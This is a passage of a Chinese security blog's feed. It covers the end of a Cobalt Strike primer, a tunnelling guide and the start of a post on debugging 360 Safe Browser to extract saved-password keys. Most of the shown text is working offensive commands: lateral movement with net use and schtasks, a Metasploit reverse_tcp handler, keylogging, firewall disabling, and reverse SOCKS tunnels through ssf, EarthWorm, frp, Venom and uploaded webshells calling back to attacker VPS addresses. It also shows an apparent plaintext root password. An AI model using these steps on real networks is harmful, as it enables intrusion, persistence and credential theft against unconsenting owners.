src="/img/CobalStrikeLiteracy/0.5106082009923364.png" alt="img"></p><p>通过net use和不出网的内网机器建立IPC连接，然后将beacon.exe 复制到目标机器里，再使用计划任务schtasks执行beacon.exe即可上线</p><p><img src="/img/CobalStrikeLiteracy/0.9823994953797551.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.7953847017401188.png" alt="img"></p><p>成功上线</p><p><img src="/img/CobalStrikeLiteracy/0.21118317239101586.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.9080092441580215.png" alt="img"></p><h2 id="0x08-联动MSF"><a href="#0x08-联动MSF" class="headerlink" title="0x08 联动MSF"></a>0x08 联动MSF</h2><p>msf监听</p><pre><code>use exploit/multi/handlerset payload windows/meterpreter/reverse_tcpset lhost set lport run</code></pre><p><img src="/img/CobalStrikeLiteracy/0.9925311858482716.png" alt="img"></p><p>创建一个监听器，ip和port设置为msf的ip和port</p><p><img src="/img/CobalStrikeLiteracy/0.9281324896355443.png" alt="img"></p><p>目标机器右键spawn</p><p><img src="/img/CobalStrikeLiteracy/0.1054484216844525.png" alt="img"></p><p>选择msf监听器</p><p><img src="/img/CobalStrikeLiteracy/0.44625564552911096.png" alt="img"></p><p>msf成功上线</p><p><img src="/img/CobalStrikeLiteracy/0.7665290584580648.png" alt="img"></p><h2 id="0x09-屏幕截图和键盘记录"><a href="#0x09-屏幕截图和键盘记录" class="headerlink" title="0x09 屏幕截图和键盘记录"></a>0x09 屏幕截图和键盘记录</h2><p>屏幕截图</p><p><img src="/img/CobalStrikeLiteracy/2d6ff6d6-a5b8-4169-84cc-a849b171d98a.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/d0cf3ab6-c82f-4628-a70a-9d2c0a2f033c.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/6f68852c-9ca9-42cd-8bd5-e6d1bc43ddfe.png" alt="img"></p><p>键盘记录</p><p>列出进程</p><p><img src="/img/CobalStrikeLiteracy/f82b0bfe-c88e-4897-83a4-93cc3997b560.png" alt="img"></p><p>选择全部</p><p><img src="/img/CobalStrikeLiteracy/4959af83-e744-4e3a-be57-ea62d284a959.png" alt="img"></p><p>等加载完</p><p><img src="/img/CobalStrikeLiteracy/0290b9d8-5ccb-44b0-9376-86ce1c266634.png" alt="img"></p><p>目标输入</p><p><img src="/img/CobalStrikeLiteracy/8a1a893d-5d44-4171-b608-ffba8930545c.png" alt="img"></p><p>成功记录</p><p><img src="/img/CobalStrikeLiteracy/f64438ab-5b51-4c22-98f4-9c2ae01322b3.png" alt="img"></p><h2 id="0x010-Linux上线"><a href="#0x010-Linux上线" class="headerlink" title="0x010 Linux上线"></a>0x010 Linux上线</h2><pre><code>ssh 172.16.200.30:22 root Huawei12#$</code></pre><p><img src="/img/CobalStrikeLiteracy/84d1bbd8-e8ff-4b27-8789-f72df2479c74.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> CobalStrike </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CobalStrike扫盲 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网穿透</title>
      <link href="/2020/11/27/nei-wang-chuan-tou/"/>
      <url>/2020/11/27/nei-wang-chuan-tou/</url>
      
        <content type="html"><![CDATA[<h1 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h1><h2 id="0x00-环境-工具"><a href="#0x00-环境-工具" class="headerlink" title="0x00 环境-工具"></a>0x00 环境-工具</h2><h3 id="0x00-1-靶场介绍"><a href="#0x00-1-靶场介绍" class="headerlink" title="0x00-1 靶场介绍"></a>0x00-1 靶场介绍</h3><p>以下端口转发和代理都是自己的VPS做演练。</p><pre><code>Linux：      207.148.119.98Windows:     45.76.153.192</code></pre><h3 id="0x00-2用到的转发-代理工具"><a href="#0x00-2用到的转发-代理工具" class="headerlink" title="0x00-2用到的转发|代理工具:"></a>0x00-2用到的转发|代理工具:</h3><pre><code>ssf             https://www.ctolib.com/article/releases/68618abptts          https://github.com/nccgroup/ABPTTSearthworm       http://rootkiter.com/EarthWormfrp             https://github.com/fatedier/frpNeo-reGeorg     https://github.com/L-codes/Neo-reGeorgreDuh           https://github.com/sensepost/reDuhVenom           https://github.com/Dliv3/Venom                https://github.com/Dliv3/Venom/releases/download/v1.1.0/Venom.v1.1.0.7z</code></pre><h3 id="0x00-3-流量代理工具"><a href="#0x00-3-流量代理工具" class="headerlink" title="0x00-3 流量代理工具"></a>0x00-3 流量代理工具</h3><pre><code>proxifier       https://www.proxifier.comproxychains     apt install proxychains</code></pre><h2 id="0x01-netsh端口转发"><a href="#0x01-netsh端口转发" class="headerlink" title="0x01 netsh端口转发"></a>0x01 netsh端口转发</h2><p>条件：管理员权限    用windows自带的netsh</p><pre><code>netsh firewall show config              查看防火墙配置netsh firewall show state               查看当前系统防火墙状态 netsh interface portproxy show all      查看端口转发</code></pre><p><img src="/img/NAT/5131e65c-49c2-4a36-83ba-137cc88b0c09.png" alt="img"></p><p><img src="/img/NAT/4a12db30-9512-4527-83e1-d9a58caf8c35.png" alt="img"></p><p><img src="/img/NAT/98b51d48-07ac-4e13-af0b-f6d7cacf295e.png" alt="img"></p><p><img src="/img/NAT/2bd37ada-a395-4515-b670-689722a93c08.png" alt="img"></p><pre><code>把来自外部的 tcp 的 10086 端口流量全部转发到内网机器的 3389 端口上 建立规则：netsh advfirewall firewall add rule name=&quot;aaaaaa&quot; dir=in action=allow protocol=TCP localport=10086netsh interface portproxy add v4tov4 listenport=10086 connectaddress=127.0.0.1 connectport=3389netsh firewall show statenetsh interface portproxy show all删除规则：netsh advfirewall firewall delete rule name=&quot;aaaaaa&quot; dir=in protocol=TCP localport=10086netsh interface portproxy delete v4tov4 listenport=10086netsh firewall show statenetsh interface portproxy show all</code></pre><p><img src="/img/NAT/ea3de34d-1253-4cd4-b44c-53b6fa76b434.png" alt="img"></p><p><img src="/img/NAT/9bccef79-9834-44e7-abdc-196d5e6f8087.png" alt="img"></p><p>远程登陆连接目标IP:10086端口</p><p><img src="/img/NAT/0537afc6-346d-44a2-bfde-248a01e54abb.png" alt="img"></p><pre><code>a) 关于 netsh 在 2003 下的操作命令相对于之后的系统有所不同,这里稍微注意下 # netsh firewall show state  查看当前系统防火墙状态 # netsh firewall set opmode disable 关闭当前系统防火墙 # netsh firewall set opmode enable 启用当前系统防火墙b) 对于 2003 以后的系统,可使用如下的命令管理防火墙 # netsh advfirewall show allprofiles    查看当前系统所有网络类型的防火墙状态,比如,私有,公共,域网络 # netsh advfirewall set allprofiles state off  关闭当前系统防火墙 # netsh advfirewall set allprofiles state on  启用当前系统防火墙 # netsh advfirewall reset        重置当前系统的所有防火墙规则,会初识到刚装完系统的状态 # netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot; 自定义防火墙日志位置 add 为增加规则,delete 为删除规则 allow 为允许连接, block 为阻断连接 in 为入站,out 为出站 name 为要显示的规则名称</code></pre><h2 id="0x02-ssf正反向跨平台socks代理"><a href="#0x02-ssf正反向跨平台socks代理" class="headerlink" title="0x02 ssf正反向跨平台socks代理"></a>0x02 ssf正反向跨平台socks代理</h2><pre><code>反向代理：将ssf.exe和certs文件夹传到靶机里，然后在ssf.exe的目录下运行程序正向代理：将ssfd.exe和certs文件夹传到靶机里，然后在ssfd.exe的目录下运行程序</code></pre><h3 id="0x02-1-SSF-反向-socks-代理"><a href="#0x02-1-SSF-反向-socks-代理" class="headerlink" title="0x02-1 SSF 反向 socks 代理"></a>0x02-1 SSF 反向 socks 代理</h3><pre><code>靶机       Linux      207.148.119.98攻击机     Windows    45.76.153.192        安装proxifier做socks代理 </code></pre><pre><code>第一步：本地监听1050端口 ssfd.exe -p 1050./ssfd -p 1050</code></pre><p><img src="/img/NAT/3a3bec3f-2289-4b85-8e9b-59fc2e771fcd.png" alt="img"></p><pre><code>第二步：目标边界连接我们的1050端口，并将数据转发给1051端口ssf.exe -F 1051 -p 1050 45.76.153.192./ssf -F 1051 -p 1050 45.76.153.192</code></pre><p><img src="/img/NAT/25adbb09-cc30-4d3b-82d5-0fe5e34960e8.png" alt="img"></p><p><img src="/img/NAT/65364b36-5ed7-473d-87e7-699a21c050ff.png" alt="img"></p><pre><code>第三步：本地proxifier代理本地127.0.0.1的1051端口</code></pre><p><img src="/img/NAT/a5873ff9-3d30-4615-9ad5-7a45c763142b.png" alt="img"></p><pre><code>第四步：成功代理上目标边界，现在即可访问内网</code></pre><p><img src="/img/NAT/f12f1aa2-b4d5-45f2-b5fe-1320535b1315.png" alt="img"></p><h3 id="0x02-2-SSF-正向-socks-代理"><a href="#0x02-2-SSF-正向-socks-代理" class="headerlink" title="0x02-2 SSF 正向 socks 代理"></a>0x02-2 SSF 正向 socks 代理</h3><p>为什么要讲正向代理呢，要是目标的防火墙设置比较严，只准进不准出，而我们又没有权限更改防火墙规则</p><p>那么我们就可以可以正向socks代理进去</p><pre><code>靶机       45.76.153.192          ssfd.exe -p 1050                        监听攻击机     207.148.119.98         ./ssf -D 1051 -p 1050 45.76.153.192      正向连接</code></pre><pre><code>第一步：目标边界监听1050端口 ssfd.exe -p 1050./ssfd -p 1050</code></pre><p><img src="/img/NAT/c962aa91-062b-4006-8ee5-b50b0abffb6f.png" alt="img"></p><pre><code>第二步：攻击机连接目标边界的1050端口，并将数据转发给1051端口ssf.exe -D 1051 -p 1050 45.76.153.192./ssf -D 1051 -p 1050 45.76.153.192</code></pre><p><img src="/img/NAT/11b10c38-4aa9-4c18-b9c2-f48222af1f44.png" alt="img"></p><pre><code>第三步：本地proxifier代理本地127.0.0.1的1051端口</code></pre><h2 id="0x03-abptts正向端口转发"><a href="#0x03-abptts正向端口转发" class="headerlink" title="0x03 abptts正向端口转发"></a>0x03 abptts正向端口转发</h2><pre><code>靶机       45.76.153.192          放置webshell攻击机     207.148.119.98         python abpttsclient.py -c webshell/config.txt -u &quot;http://45.76.153.192/abptts.jsp&quot; -f 127.0.0.1:33389/127.0.0.1:3389</code></pre><h3 id="0x03-1-安装"><a href="#0x03-1-安装" class="headerlink" title="0x03-1 安装"></a>0x03-1 安装</h3><pre><code>git clone  https://github.com/nccgroup/ABPTTS.gitapt install python-setuptoolsapt install python-pippip install --upgrade pippython -m pip install pycryptopython -m pip install pycryptodomepython -m pip install httplib2cd ABPTTSpython abpttsfactory.py -o webshell</code></pre><p><img src="/img/NAT/09e9c199-9f9a-4ca6-8d89-40f95bd20e86.png" alt="img"></p><p><img src="/img/NAT/fa399938-7c2a-46fd-8fe5-48db061c79ad.png" alt="img"></p><h2 id="0x02-目标边界上传脚本"><a href="#0x02-目标边界上传脚本" class="headerlink" title="0x02 目标边界上传脚本"></a>0x02 目标边界上传脚本</h2><p><img src="/img/NAT/1e66344f-3788-45b1-b67c-973c3cbb76a8.png" alt="img"></p><h2 id="0x03-攻击机连接"><a href="#0x03-攻击机连接" class="headerlink" title="0x03 攻击机连接"></a>0x03 攻击机连接</h2><pre><code>命令格式：python abpttsclient.py -c webshell/config.txt -u &quot;http://192.168.1.119/abptts.aspx&quot; -f 本地内网IP:本地端口/目标边界内网IP:需要转发的目标边界的端口# 将目标边界的3389转发到本地的33389端口上python abpttsclient.py -c webshell/config.txt -u &quot;http://45.76.153.192/abptts.jsp&quot; -f 127.0.0.1:33389/127.0.0.1:3389</code></pre><p><img src="/img/NAT/bb8e1084-840b-4125-8444-c1e5ad0cbebf.png" alt="img"></p><p><img src="/img/NAT/f094d308-1f11-4437-9138-4178a8d7b7c1.png" alt="img"></p><h2 id="0x04-earthworm正反向跨平台socks代理"><a href="#0x04-earthworm正反向跨平台socks代理" class="headerlink" title="0x04 earthworm正反向跨平台socks代理"></a>0x04 earthworm正反向跨平台socks代理</h2><pre><code>ew_for_Win.exe-h 查看帮助-s 指定链路状态(ssocksd、rcsocks、rssocks、lcx_slave、lcx_listen、 lcx_tran)ssocksd：正向socks5代理连接;rcsocks、rssocks：反向socks5代理连接;lcx_slave、lcx_listen：端口转发;lcx_tran：端口映射;-l 开放指定端口监听;-d 指定转发或反弹的主机地址；-e 指定转发或反弹的主机端口；-f 指定连接或映射的主机地址；-g 指定连接或映射的主机端口；-t 设置超时时间，默认为10000毫秒，即10秒(单位毫秒，-h显示有误)；-v 显示版本；-a 显示关于页面；正向代理    ssocksd反向代理    rcsocks,rssocks端口转发    lcx_listen,lcx_slave,lcx_tran</code></pre><h3 id="0x04-1-反向socks代理"><a href="#0x04-1-反向socks代理" class="headerlink" title="0x04-1 反向socks代理"></a>0x04-1 反向socks代理</h3><pre><code>攻击机：     45.76.153.192       ew_for_Win.exe -s rcsocks -l 1080 -e 53             监听目标边界：   207.148.119.98      ew_for_Win.exe -s rssocks -d 45.76.153.192 -e 53    反向连接</code></pre><p>攻击机监听：</p><p><img src="/img/NAT/0daa9796-1a70-478b-8872-58a4d445e67e.png" alt="img"></p><p>目标边界反弹：</p><p><img src="/img/NAT/d22ce0f5-1afb-4b68-88cb-164e160ca3ea.png" alt="img"></p><p>攻击机成功收到</p><p><img src="/img/NAT/37b3dcbf-60ff-4f2e-a226-67c1aa7531f8.png" alt="img"></p><p>proxifier代理</p><p><img src="/img/NAT/733c4164-81f2-4bd0-b99b-32ed1bc517f2.png" alt="img"></p><h3 id="0x04-2-正向socks代理"><a href="#0x04-2-正向socks代理" class="headerlink" title="0x04-2 正向socks代理"></a>0x04-2 正向socks代理</h3><pre><code>目标边界：   45.76.153.192       ew_for_Win.exe -s ssocksd -l 10085      开启监听攻击机：     207.148.119.98      proxifier或者proxychains代理           45.76.153.192 10085</code></pre><p>目标边界监听</p><p><img src="/img/NAT/fe790c1a-1c5e-4367-ace7-486ca3cb64d5.png" alt="img"></p><p>攻击机配置代理</p><pre><code>vi /etc/proxychains.confsocks5 45.76.153.192 10085</code></pre><p><img src="/img/NAT/9c4c811f-0960-49ed-957a-a94629811980.png" alt="img"></p><p>攻击机使用代理执行命令</p><pre><code>proxychains curl http://ip-api.com/json/?lang=zh-CN</code></pre><p>成功代理</p><p><img src="/img/NAT/4f8ad7be-77d1-4f37-9b78-0375635b6359.png" alt="img"></p><h2 id="0x05-frp反向socks代理"><a href="#0x05-frp反向socks代理" class="headerlink" title="0x05 frp反向socks代理"></a>0x05 frp反向socks代理</h2><h3 id="0x05-1-工具下载地址"><a href="#0x05-1-工具下载地址" class="headerlink" title="0x05-1 工具下载地址"></a>0x05-1 工具下载地址</h3><pre><code>https://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_windows_amd64.ziphttps://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_windows_386.ziphttps://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_linux_amd64.tar.gzhttps://github.com/fatedier/frp/releases/download/v0.28.2/frp_0.28.2_linux_386.tar.gz</code></pre><h3 id="0x05-2-反向代理"><a href="#0x05-2-反向代理" class="headerlink" title="0x05-2 反向代理"></a>0x05-2 反向代理</h3><pre><code>攻击机：        45.76.153.192         frps.exe -c frps.ini        开启监听目标边界：      207.148.119.98        ./frpc -c frpc.ini          反向连接</code></pre><p>攻击机监听：</p><pre><code>攻击机先配置frps.ini文件# frps.ini[common]bind_addr = 0.0.0.0bind_port = 7000token = www.nat.ee开始监听frps.exe -c frps.ini[common]bind_addr = 0.0.0.0bind_port = 7000</code></pre><p><img src="/img/NAT/5b59904d-1e77-45f1-bb37-f64f882fbc06.png" alt="img"></p><p><img src="/img/NAT/392fcaf1-2018-46c4-b777-4f0dc5b743e8.png" alt="img"></p><p>目标边界反向连接</p><pre><code>目标边界先配置frpc.ini文件# frpc.ini[common]server_addr = 45.76.153.192         # 自己公网VPS的IPserver_port = 7000                  # 自己公网VPS监听的端口token = www.nat.ee                  # 必须得有，否则会authorization failed[http_proxy]type = tcp#local_ip = 127.0.0.1#local_port = 22remote_port = 8010                  # 公网VPS的proxifier设置的端口plugin = socks5                     # 使用插件socks代理plugin_user = abc                   # proxifier连接的账号密码plugin_passwd = abc执行反向连接命令：./frpc -c frpc.ini[common]server_addr = 45.76.153.192server_port = 7000[http_proxy]type = tcpremote_port = 8010plugin = socks5</code></pre><p><img src="/img/NAT/cf200062-acd3-4ad5-a12a-39ab37b8afd8.png" alt="img"></p><p><img src="/img/NAT/c1b2b2f2-fedf-49e1-9194-dfe9b8e3c52f.png" alt="img"></p><p>攻击机成功收到</p><p><img src="/img/NAT/18fe4112-44da-47c0-9e16-c650e07d1ffb.png" alt="img"></p><pre><code>proxifier设置45.76.153.192 8010并输入账号密码 abc abc</code></pre><p><img src="/img/NAT/33feaf3d-a125-43c2-8f9e-bb4e6981e59d.png" alt="img"></p><p>成功代理</p><p><img src="/img/NAT/52fd1ffc-943b-4163-9f0f-5f32d7db1438.png" alt="img"></p><h2 id="0x06-Neo-reGeorg正向socks代理"><a href="#0x06-Neo-reGeorg正向socks代理" class="headerlink" title="0x06 Neo-reGeorg正向socks代理"></a>0x06 Neo-reGeorg正向socks代理</h2><pre><code>目标边界：      45.76.153.192         放置webshell攻击机：        207.148.119.98        python neoreg.py -k 123456 -u http://45.76.153.192:8080/tunnel.jsp</code></pre><h3 id="0x06-1-webshell生成"><a href="#0x06-1-webshell生成" class="headerlink" title="0x06-1 webshell生成"></a>0x06-1 webshell生成</h3><pre><code>python neoreg.py generate -k 123456</code></pre><p><img src="/img/NAT/3bf62c09-2832-4f42-98f6-4c55e2440be0.png" alt="img"></p><h3 id="0x06-2-目标边界上传脚本"><a href="#0x06-2-目标边界上传脚本" class="headerlink" title="0x06-2 目标边界上传脚本"></a>0x06-2 目标边界上传脚本</h3><p><img src="/img/NAT/fe74b5f5-a42f-4507-8aa4-7f47c4970da8.png" alt="img"></p><h3 id="0x06-3-攻击机连接"><a href="#0x06-3-攻击机连接" class="headerlink" title="0x06-3 攻击机连接"></a>0x06-3 攻击机连接</h3><pre><code>使用 neoreg.py 连接WEB服务器，在本地建立 socks 代理python neoreg.py -k 123456 -u http://45.76.153.192:8080/tunnel.jsp</code></pre><p><img src="/img/NAT/5d179485-ab63-4db1-bb2c-2f4ccdc01481.png" alt="img"></p><p>修改proxychains.conf，socks5 127.0.0.1 1080</p><p><img src="/img/NAT/fe96a7f8-6ed9-460f-b271-a97d303e9c55.png" alt="img"></p><p>使用proxychains成功代理上</p><p><img src="/img/NAT/8831e2c5-a62a-4750-a9c6-4b6ef6ec4fd2.png" alt="img"></p><h2 id="0x07-reDuh正向端口转发"><a href="#0x07-reDuh正向端口转发" class="headerlink" title="0x07 reDuh正向端口转发"></a>0x07 reDuh正向端口转发</h2><pre><code>目标边界：      45.76.153.192         放置webshell攻击机：        207.148.119.98        java -jar reduhclient.jar http://目标域名/reduh.php</code></pre><h3 id="0x07-1-目标边界放置webshell"><a href="#0x07-1-目标边界放置webshell" class="headerlink" title="0x07-1 目标边界放置webshell"></a>0x07-1 目标边界放置webshell</h3><p><img src="/img/NAT/7e0cbae9-dd59-4cff-b3da-4765abc8c3d4.png" alt="img"></p><h3 id="0x07-2-攻击机连接"><a href="#0x07-2-攻击机连接" class="headerlink" title="0x07-2 攻击机连接"></a>0x07-2 攻击机连接</h3><pre><code>java -jar reduhclient.jar http://45.76.153.192:8080/reDuh.jsp</code></pre><p><img src="/img/NAT/17115e5c-1a06-4229-bbfa-61f93b5fa6eb.png" alt="img"></p><h3 id="0x07-3-绑定端口-建立隧道"><a href="#0x07-3-绑定端口-建立隧道" class="headerlink" title="0x07-3 绑定端口-建立隧道"></a>0x07-3 绑定端口-建立隧道</h3><pre><code>telnet 127.0.0.1 1010</code></pre><p><img src="/img/NAT/03f76de7-695a-4ec6-95e5-a8b873281c6b.png" alt="img"></p><h3 id="0x07-4-端口转发"><a href="#0x07-4-端口转发" class="headerlink" title="0x07-4 端口转发"></a>0x07-4 端口转发</h3><pre><code>[createTunnel]要绑定到本地哪个端口上[8888]:127.0.0.1:要绑定远程机器上的哪个端口[3389,22] [createTunnel]8888:127.0.0.1:3389</code></pre><p><img src="/img/NAT/e6479ef8-7cd7-43cb-a463-1edb8e6481ae.png" alt="img"></p><p>成功连接</p><p><img src="/img/NAT/d2ae1bc3-37d8-4ae0-b2e8-7a2a1f383df1.png" alt="img"></p><h2 id="0x08-venom反向socks代理"><a href="#0x08-venom反向socks代理" class="headerlink" title="0x08 venom反向socks代理"></a>0x08 venom反向socks代理</h2><pre><code>目标边界：      45.76.153.192         agent.exe -rhost 207.148.119.98 -rport 9999攻击机：        207.148.119.98        ./admin_linux_x86 -lport 9999</code></pre><h3 id="0x08-1-攻击机监听"><a href="#0x08-1-攻击机监听" class="headerlink" title="0x08-1 攻击机监听"></a>0x08-1 攻击机监听</h3><pre><code>./admin_linux_x86 -lport 9999</code></pre><p><img src="/img/NAT/5b0d723b-e387-4a8e-8da1-525f0e808a37.png" alt="img"></p><h3 id="0x08-2-靶机反向连接"><a href="#0x08-2-靶机反向连接" class="headerlink" title="0x08-2 靶机反向连接"></a>0x08-2 靶机反向连接</h3><pre><code>agent.exe -rhost 207.148.119.98 -rport 9999</code></pre><p><img src="/img/NAT/3bf13a8a-8c4e-42c3-a405-1f592aeb2f12.png" alt="img"></p><h3 id="0x08-3-攻击机成功接收"><a href="#0x08-3-攻击机成功接收" class="headerlink" title="0x08-3 攻击机成功接收"></a>0x08-3 攻击机成功接收</h3><p><img src="/img/NAT/2a851af9-7446-4d2f-8d78-5b5e24377d65.png" alt="img"></p><pre><code>show                展现节点goto 1              进入节点1socks 6666          做socks代理，代理只需要连接207.148.119.98 6666即可代理上45.76.153.192shell               进入交互式终端执行命令</code></pre><p><img src="/img/NAT/3d6699df-79a0-4336-a233-68fd4fd4a1dd.png" alt="img"></p><p><img src="/img/NAT/31dbfb20-4485-45cc-8eb1-671ac1885b03.png" alt="img"></p><p>成功代理</p><p><img src="/img/NAT/5efa974e-c268-4cec-92c9-df4785cffc9e.png" alt="img"></p><h2 id="0x09-ssh端口转发和socks代理"><a href="#0x09-ssh端口转发和socks代理" class="headerlink" title="0x09 ssh端口转发和socks代理"></a>0x09 ssh端口转发和socks代理</h2><pre><code>-f 后台运行-C 允许压缩数据-N 不执行任何命令-R 将端口绑定到远程服务器，反向代理-L 将端口绑定到本地客户端，正向代理</code></pre><p>下面的例子里，ssh端口是5510</p><p>60.247.XXX.XXX 香港VPS    模拟外网VPS</p><p>122.114.XXX.XXX 河南郑州VPS    模拟内网服务器</p><h3 id="0x09-1-本地转发"><a href="#0x09-1-本地转发" class="headerlink" title="0x09-1 本地转发"></a>0x09-1 本地转发</h3><pre><code>ssh -fCNL &lt;local port&gt;:&lt;remote host&gt;:&lt;remote port&gt; &lt;SSH hostname&gt;local port：转发到本地的端口remote host：远程服务器的IPremote port：远程服务器的端口SSH hostname：本地服务器的IP或者主机名因为是本地转发，将本地的88端口转发到本地的89端口，所以local port = 89remote host = 127.0.0.1remote port = 88SSH hostname = 127.0.0.1-p参数指向本地服务器ssh的端口在内网的服务器上运行    ssh -fCNL 89:127.0.0.1:88 127.0.0.1 -p 5510    curl http://127.0.0.1:89</code></pre><p><img src="/img/NAT/a1f72ef3-ed08-40ba-89b4-e9844984f2e3.png" alt="img"></p><p>本地转发需要输入当前服务器的密码</p><p><img src="/img/NAT/9174d7e6-001c-4270-b8d3-ba8af8b11f2c.png" alt="img"></p><p>可以看到成功转发</p><p><img src="/img/NAT/6f59907b-429c-4c1b-8c31-636794cb90c5.png" alt="img"></p><h3 id="0x09-2-远程端口转发"><a href="#0x09-2-远程端口转发" class="headerlink" title="0x09-2 远程端口转发"></a>0x09-2 远程端口转发</h3><pre><code>ssh -fCNR &lt;remote port&gt;:&lt;local host&gt;:&lt;local port&gt; &lt;remote host&gt;将local host的local port转发到remote host的remote port提示输入remote host的密码在内网的服务器上（122.114.XXX.XXX）运行, 前提是内网服务器能够ssh到远程服务器60.247.XXX.XXX。将当前服务器的5510端口转发到远程服务器60.247.XXX.XXX的5500端口    ssh -fCNR 5500:127.0.0.1:5510 root@60.247.XXX.XXX -p 5510在外网自己的服务器（60.247.XXX.XXX）上运行，ssh外网自己服务器的5500端口就被转发到了内网服务器的5510端口    ssh root@127.0.0.1 -p 5500</code></pre><p>在内网服务器输入下面命令进行端口转发，需要输入远程服务器的密码</p><p><img src="/img/NAT/9baa60c4-4a31-4257-b9df-6bc4035a417c.png" alt="img"></p><p>远程服务器（60.247.XXX.XXX）输入下面命令，ssh本地的5500端口，就会ssh到内网服务器（122.114.XXX.XXX）去</p><p><img src="/img/NAT/275a8347-8a5d-4df6-8a8f-8d3447ebbe08.png" alt="img"></p><h3 id="0x09-3-socks代理"><a href="#0x09-3-socks代理" class="headerlink" title="0x09-3 socks代理"></a>0x09-3 socks代理</h3><pre><code>建立反向代理呢？其实就是把正向代理和转发结合起来即可前提条件：需要知道内网服务器的密码内网进行端口转发，将本地的ssh端口5510转发到远程的5500端口,需要输入远程服务器的密码    ssh -qngfNTR 5500:localhost:5510 root@60.247.XXX.XXX -p 5510外网进行正向socks代理，ssh连接本地的5500端口，即连接到内网服务器，然后搭建正向socks代理。代理端口为6767，需要输入内网服务器的密码    ssh -qngfNTD 6767 root@127.0.0.1 -p 5500</code></pre><p>在内网输入下面命令，将内网的ssh端口转发到外网服务器的某个端口上</p><p><img src="/img/NAT/8e3cae36-15e6-4d2e-91b6-49e65b1aae40.png" alt="img"></p><p>在外网的服务器输入下面命令，ssh连接本地的5500端口，即连接到内网服务器，然后搭建正向socks代理，socks端口为6767，需要输入内网服务器的密码</p><p><img src="/img/NAT/5a356b79-6a9d-43bd-8e5c-16aa83767acc.png" alt="img"></p><p>proxifier连接远程服务器的6767端口</p><p><img src="/img/NAT/eded93a8-6b94-45c5-b423-0945320a8afc.png" alt="img"></p><h3 id="0x09-4-删除端口转发"><a href="#0x09-4-删除端口转发" class="headerlink" title="0x09-4 删除端口转发"></a>0x09-4 删除端口转发</h3><pre><code>ps aux | grep sshkill &lt;id&gt;kill -9 &lt;id&gt;</code></pre><p><img src="/img/NAT/bd1181ea-413a-4aa1-a8bb-ab5f7b0079fe.png" alt="img"></p><h2 id="0x10-多层代理"><a href="#0x10-多层代理" class="headerlink" title="0x10 多层代理"></a>0x10 多层代理</h2><p><img src="/img/NAT/66528187.png" alt="img"></p><p><img src="/img/NAT/35693890.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网穿透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态调试360安全浏览器获取密钥</title>
      <link href="/2020/11/26/dong-tai-diao-shi-360-an-quan-liu-lan-qi-huo-qu-mi-yao/"/>
      <url>/2020/11/26/dong-tai-diao-shi-360-an-quan-liu-lan-qi-huo-qu-mi-yao/</url>
      
        <content type="html"><![CDATA[<h1 id="动态调试360安全浏览器获取密钥"><a href="#动态调试360安全浏览器获取密钥" class="headerlink" title="动态调试360安全浏览器获取密钥"></a>动态调试360安全浏览器获取密钥</h1><p><img src="/img/360SafeBrowser/28edde14-bc20-4f6d-a3e2-90d61e7d4093.png" alt="img"></p><p>按F9开启调试</p><p><img src="/img/360SafeBrowser/c6a9bd27-653c-4000-a59a-d4c427beb610.png" alt="img"></p><p>将启动的所有的异常都忽略，不然总是暂停</p><p><img src="/img/360SafeBrowser/8c02793e-6d28-4749-99b9-e8177b8d016e.png" alt="img"></p><p><img src="/img/360SafeBrowser/3316bb99-5a8b-4834-841d-604786c2b753.png" alt="img"></p><p>这样就不会因为异常暂停了，直接就打开了360安全浏览器</p><p><img src="/img/360SafeBrowser/7521b024-57b7-44e7-bb0b-d79dcafebd5d.png" alt="img"></p><p><img src="/img/360SafeBrowser/3557fbcb-b98e-46f7-8ce6-d834e60deadb.png" alt="img"></p><p>因为浏览器保存了账号密码，刚才打开网站时自动填充了密码，那么这个过程中的字符串肯定都被x32dbg保存着了。于是在所有模块的字符串里搜索password等可能会存在的关键字符串去定位解密的输入点，然后断点调试。</p><p><img src="/img/360SafeBrowser/c6bed575-d28d-4023-96cb-ce236e7cdbcd.png" alt="img"></p><p><img src="/img/360SafeBrowser/1fb574ae-d7de-4794-831b-502fed4d177d.png" alt="img"></p><p>双击跟入，在688C530B下断点，双击右侧空白处可以添加注释</p><p><img src="/img/360SafeBrowser/445b96d4-5bb2-4daa-a54b-973e20e65edf.png" alt="img"></p><p>进入到解密的函数里，可以如下图操作进入，也可以按回车进入</p><p><img src="/img/360SafeBrowser/3418d97e-3f45-4e61-989a-25377abf0687.png" alt="img"></p><p><img src="/img/360SafeBrowser/79eb9701-7f70-40e2-a425-cf15beb5cfeb.png" alt="img"></p><p>然后重新按F9让程序跑完，然后刷新浏览器页面</p><p><img src="/img/360SafeBrowser/6c64d98b-39b9-4ea6-9a06-4b83a59e0e20.png" alt="img"></p><p><img src="/img/360SafeBrowser/744152db-0da6-4aa3-bd6e-cb3b34e0980a.png" alt="img"></p><p>按F8步过调试</p><p><img src="/img/360SafeBrowser/d4b5455f-056f-4b94-9475-d33860c95995.png" alt="img"></p><p>设置断点后，回车跟入</p><p><img src="/img/360SafeBrowser/39514d23-7832-40d8-99a8-58a15a2e863b.png" alt="img"></p><p>设置断点</p><p><img src="/img/360SafeBrowser/be67cb69-a035-4cb0-a5bb-1afc2d5e3c65.png" alt="img"></p><p>重新F9让程序跑完后，再刷新页面，停到691FE582断点处</p><p><img src="/img/360SafeBrowser/329097e4-5d2a-4e42-94bd-34b238890f4a.png" alt="img"></p><p><img src="/img/360SafeBrowser/ed5eabe2-4954-4101-900c-244cc78b1214.png" alt="img"></p><p><img src="/img/360SafeBrowser/f7375b32-8d09-4e7a-8edf-19fe0bb455d7.png" alt="img"></p><p><img 